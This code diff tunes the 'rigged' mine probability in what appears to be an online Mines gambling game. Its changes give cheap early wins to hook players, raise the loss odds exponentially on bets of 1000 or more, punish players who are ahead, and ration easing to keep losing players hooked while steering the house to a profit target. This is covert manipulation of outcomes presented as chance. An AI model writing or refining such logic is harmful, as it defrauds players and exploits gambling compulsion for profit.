@@ -100,14 +100,19 @@ function shouldBeMine(
   const remaining = gridSize - safeRevealed;
   const fairProb = mineCount / Math.max(remaining, 1);
 
-  // First click slightly safe to hook, then escalate
+  // First click slightly safe to hook, but not for big bets
   let riggedProb: number;
+  const isBigBet = currentBet >= 1000;
   if (safeRevealed === 0) {
-    riggedProb = fairProb * 0.5; // Very safe first click
+    riggedProb = fairProb * (isBigBet ? 0.8 : 0.5);
   } else if (safeRevealed === 1) {
-    riggedProb = fairProb * 0.8;
+    riggedProb = fairProb * (isBigBet ? 1.2 : 0.8);
   } else {
-    riggedProb = fairProb * (1 + safeRevealed * 0.35); // Linear escalation
+    // Exponential escalation instead of linear for big bets
+    const escalation = isBigBet 
+      ? (1 + safeRevealed * 0.5 + Math.pow(safeRevealed, 1.5) * 0.1)
+      : (1 + safeRevealed * 0.35);
+    riggedProb = fairProb * escalation;
   }
 
   // === LAYER 2: Current round — potential payout analysis ===
@@ -141,6 +146,7 @@ function shouldBeMine(
   if (potentialPayout > 25000) riggedProb *= 3.0;
 
   // === LAYER 3: Cumulative user profit/loss ===
+  // Only ease up after minimum 5 games to prevent early exploitation
   if (stats.totalWagered > 0) {
     const userNetProfit = stats.totalPaidOut - stats.totalWagered;
 
@@ -149,39 +155,36 @@ function shouldBeMine(
       const profitPercent = (userNetProfit / stats.totalWagered) * 100;
 
       if (profitPercent > 30) {
-        // User won 30%+ of what they wagered — crash hard
         riggedProb *= 2.5;
       } else if (profitPercent > 15) {
         riggedProb *= 1.8;
       } else if (profitPercent > 5) {
         riggedProb *= 1.4;
       }
-    } else {
-      // User is in loss — check if house is too profitable
+    } else if (stats.totalGames >= 5) {
+      // Only ease up after 5+ games — don't give free wins early
       const lossPercent = Math.abs(userNetProfit / stats.totalWagered) * 100;
 
       if (lossPercent > 60) {
-        // User lost 60%+ — ease up a lot, give hope
-        riggedProb *= 0.3;
+        riggedProb *= 0.5; // Reduced from 0.3 — don't ease too much
       } else if (lossPercent > 45) {
-        riggedProb *= 0.5;
+        riggedProb *= 0.7;
       } else if (lossPercent > 35) {
-        // Near target — slight ease
-        riggedProb *= 0.8;
+        riggedProb *= 0.85;
       }
     }
 
-    // House profit enforcement (global target)
-    if (houseProfit < target - 15) {
-      // House losing badly — emergency crash mode
-      riggedProb *= 2.0;
-    } else if (houseProfit < target - 8) {
-      riggedProb *= 1.5;
-    } else if (houseProfit > target + 20) {
-      // House too greedy — let user win to keep playing
-      riggedProb *= 0.4;
-    } else if (houseProfit > target + 10) {
-      riggedProb *= 0.6;
+    // House profit enforcement — only after 5+ games, pick ONE adjustment (not stacking)
+    if (stats.totalGames >= 5) {
+      if (houseProfit < target - 15) {
+        riggedProb *= 2.0;
+      } else if (houseProfit < target - 8) {
+        riggedProb *= 1.5;
+      } else if (houseProfit > target + 20) {
+        riggedProb *= 0.6; // Reduced from 0.4
+      } else if (houseProfit > target + 10) {
+        riggedProb *= 0.75;
+      }
     }
   }
 
